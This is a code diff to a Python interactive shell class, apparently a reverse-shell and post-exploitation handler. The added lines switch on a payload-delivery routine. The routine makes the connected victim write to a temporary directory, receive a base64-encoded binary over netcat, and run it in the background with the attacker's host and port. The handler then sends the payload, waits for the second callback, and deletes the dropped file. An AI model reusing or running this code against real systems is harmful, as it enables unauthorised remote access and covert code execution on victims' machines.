@@ -154,34 +154,41 @@ class LocalShell(cmd.Cmd):
     """
 
     def do_listen(self, line):
+        paths = ["/tmp", "/var/tmp", "/dev/shm"]
         if not line:
             host, port = ("0.0.0.0", 4242)
         else:
             host, port = line.strip().split(" ")
 
         sock = listen(host, port, 0)
+
+        if not sock: return
+
         sock.sysinfo = SystemInfoGatherer()
         # sock.sysinfo.binaryGatherer(sock)
 
-        if not sock: 
-            return
 
         # TODO: Make it so that if there 
         sock.sysinfo.is_nc = pretty(sock.send_command("which nc")) # This doesnt work
         if sock.sysinfo.is_nc:
             logging.info(f"Sending payload..")
-            # sock.client_socket.send(b"touch payload\n")
-            # sock.client_socket.send(b"chmod +x payload\n")
-            # sock.client_socket.send(f"setsid sh -c '{sock.sysinfo.is_nc} -lnp 1234 | base64 -d > payload && sleep 5 && ./payload {host} {port}'\n".encode())
+
+            sock.client_socket.send(f"cd /tmp || cd /var/tmp || cd /dev/shm ; touch payload ; chmod +x payload ;" \
+                                            f"setsid sh -c '{sock.sysinfo.is_nc} -lnp 1234 | base64 -d > payload ;"\
+                                            f"sleep 5 ; ./payload {host} {port}'\n"\
+                                            .encode())
+
             # TODO: add a check that confirms that netcat is running if not just skip 
             sock.server_socket.close()
             sock.client_socket.close()
-            # send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
+
+            send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
             logging.info(f"Payload sent. Starting listener..")
             sock = listen(host, port, 1)
-            if not sock:
-                return
-            # sock.send_command("rm -rf payload")
+            
+            if not sock: return
+            
+            sock.send_command("rm -rf payload")
         else:
             logging.error("Fail to sent payload. Using shell as client.")
 
